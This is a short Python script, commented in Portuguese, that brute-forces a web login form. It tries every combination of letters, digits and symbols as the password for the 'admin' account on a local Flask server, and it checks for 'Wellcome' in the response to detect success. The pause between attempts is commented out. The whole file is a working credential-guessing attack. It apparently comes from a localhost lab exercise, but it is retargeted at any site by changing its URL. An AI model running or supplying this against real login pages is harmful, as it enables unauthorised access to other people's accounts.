import requests
import itertools
import string
import time

# Função para tentar o login com uma combinação de senha
def attempt_login(username, password):
    response = requests.post(url, data={"username": username, "password": password})
    
    # Verifica se o login foi bem-sucedido pelo conteúdo da resposta
    if "Wellcome" in response.text:
        return True
    return False

# Algoritmo de força bruta
def brute_force_algorithm():
    characters = string.ascii_letters + string.digits + string.punctuation  # Conjunto de caracteres
    for length in range(1, 20):  # Tenta senhas de até 20 caracteres
        for password in itertools.product(characters, repeat=length):
            password = "".join(password)
            print(f"Tentando senha: {password}")
            
            # Testa a senha
            if attempt_login(username, password):
                print(f"Senha encontrada: {password}")
                return password
            
            # Pausa opcional para não sobrecarregar o servidor
            # time.sleep(0.1)  # 100ms de espera entre as tentativas

    print("Senha não encontrada -- força bruta falhou")
    return None

if __name__ == "__main__":
    url = "http://127.0.0.1:5000/"  # URL do servidor Flask
    username = "admin"  # Nome de usuário conhecido
    
    # Executa o algoritmo de força bruta
    brute_force_algorithm()
